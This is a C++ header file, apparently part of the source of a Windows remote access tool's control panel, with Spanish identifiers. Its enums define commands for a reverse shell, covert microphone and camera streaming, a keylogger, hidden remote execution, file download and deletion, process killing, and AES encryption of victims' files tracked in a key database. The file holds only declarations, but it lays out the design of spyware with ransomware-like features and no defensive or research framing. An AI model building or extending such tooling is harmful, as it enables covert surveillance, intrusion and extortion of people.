#ifndef _HEADERS
#define _HEADERS 1

#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>

#ifdef _DEBUG
    #define DBG_NEW new
    //#define DBG_NEW new ( _NORMAL_BLOCK , __FILE__ , __LINE__ ) //este para debug de leaks
    // Replace _NORMAL_BLOCK with _CLIENT_BLOCK if you want the
    // allocations to be of _CLIENT_BLOCK type
#else
    #define DBG_NEW new
#endif

#include<wx/wx.h> 
#include<wx/thread.h>
#include<wx/listctrl.h>
#include<wx/dcbuffer.h>
#include<wx/tglbtn.h >
#include<wx/toolbar.h>
#include<wx/treectrl.h>
#include<wx/stattext.h>
#include<wx/radiobox.h>
#include<wx/sizer.h>
#include<wx/wxhtml.h>
#include<wx/aui/aui.h>
#include<winsqlite/winsqlite3.h>

#include<ws2tcpip.h>
#include<windows.h>
#include<iostream>
#include<mutex>
#include<atomic>
#include<thread>
#include<map>
#include<random>
#include<fcntl.h>
#include<fstream>
#include<sstream>
#include<string>
#include<vector>
#include<cstring>
#include<ctime>
#include<mmsystem.h>

#include <iomanip>


#include "aes256/aes256.hpp"

#define WSA_FUNADO -31337
#define PING_TIME 5 * 1
#define AES_KEY_LEN 32
#define CLI_TIMEOUT_SECS 1
#define FRAME_CLIENT_SIZE_WIDTH 600
#define DB_FILE "./crypt_.db"
#define CMD_DEL '~'

//FM Modos
#define FM_EQUIPO    500
#define FM_NORMAL    501


extern bool bSignalFlag;
#define error() std::cout<<"Error["<<GetLastError()<<"]\n";

typedef unsigned int u_int;
typedef unsigned long long int u64;

namespace EnumIDS {
    enum Enum {
        ID_MAIN = 100,
        ID_LimpiarLog,
        ID_Interactuar,
        ID_Refrescar,
        ID_FrameClienteTest,
        ID_Main_List,
        TreeCtrl_ID,
        ID_Panel_Cliente,
        ID_Panel_Reverse_Shell,
        ID_Panel_Reverse_Shell_TxtConsole,
        ID_Panel_Test,
        ID_Panel_Label_Test,
        ID_Panel_Microphone,
        ID_Panel_Mic_CMB_Devices,
        ID_Panel_Mic_BTN_Refresh,
        ID_Panel_Mic_BTN_Escuchar,
        ID_Panel_Mic_BTN_Detener,
        ID_Panel_FM,
        ID_Panel_FM_Equipo,
        ID_Panel_FM_Escritorio,
        ID_Panel_FM_Descargas,
        ID_Panel_FM_Refresh,
        ID_Panel_FM_Subir,
        ID_Panel_FM_List,
        ID_Panel_FM_LblRuta,
        ID_Panel_FM_Editar_TXT,
        ID_Panel_FM_Editar_Save_Remoto,
        ID_Panel_FM_Editar_Save_Local,
        ID_Panel_Transferencias,
        ID_Panel_Transferencias_List,
        ID_Toggle,
        ID_Mostrar_Transfers,
        ID_Mostrar_CryptDB,
        ID_CryptDB_Refrescar,
        ID_CryptDB_Copiar,
        ID_CryptDB_Eliminar,
        ID_FM_Radio_Encriptar,
        ID_FM_BTN_Random,
        ID_FM_BTN_Crypt_Exec,
        ID_FM_Text_Password,
        ID_FM_Del_Check_Crypt,
        ID_PM_Panel,
        ID_PM_Refrescar,
        ID_PM_Kill,
        ID_KL_Panel,
        ID_KL_BTN_Toggle,
        ID_KL_BTN_Save,
        ID_KL_BTN_Clear,
        ID_KL_Text_Out,
        ID_CM_Test,
        ID_CM_PictureBox
    };
}

namespace EnumMenuFM {
    enum Enum {
        ID_Exec_Oculto = 9999,
        ID_Exec_Visible,
        ID_Editar,
        ID_Eliminar,
        ID_Descargar,
        ID_Crypt,
        ID_Decrypt,
        ID_New_Folder,
        ID_New_Archivo,
    };
}

namespace EnumComandos {
    enum Enum {
        PONG = 499,
        PING,
        Reverse_Shell_Start,
        Reverse_Shell_Command,
        Reverse_Shell_Salida,
        Reverse_Shell_Finish,
        Mic_Refre_Dispositivos,
        Mic_Refre_Resultado,
        Mic_Iniciar_Escucha,
        Mic_Detener_Escucha,
        Mic_Live_Packet,
        FM_Discos,
        FM_Discos_Lista,
        FM_Dir_Folder,
        FM_CPATH,
        FM_Crear_Folder,
        FM_Crear_Archivo,
        FM_Borrar_Archivo,
        FM_Descargar_Archivo,
        FM_Descargar_Archivo_Recibir, //Recibir paquete del cliente
        FM_Descargar_Archivo_Init, //Recibir el tamaño del archivo
        FM_Descargar_Archivo_End, //Ya se recibio todo, cerrar archivo
        FM_Ejecutar_Archivo,
        FM_Editar_Archivo,
        FM_Editar_Archivo_Paquete,
        FM_Editar_Archivo_Guardar_Remoto,
        FM_Crypt_Archivo,
        PM_Refrescar,
        PM_Kill,
        PM_Lista,
        KL_Iniciar,
        KL_Detener,
        KL_Salida,
        CM_Lista,
        CM_Lista_Salida,
        CM_Single,
        CM_Single_Salida,
        CM_Live_Start,
        CM_Live_Stop,
        FM_Crypt_Confirm,
        Mic_Stop
    };
}

#endif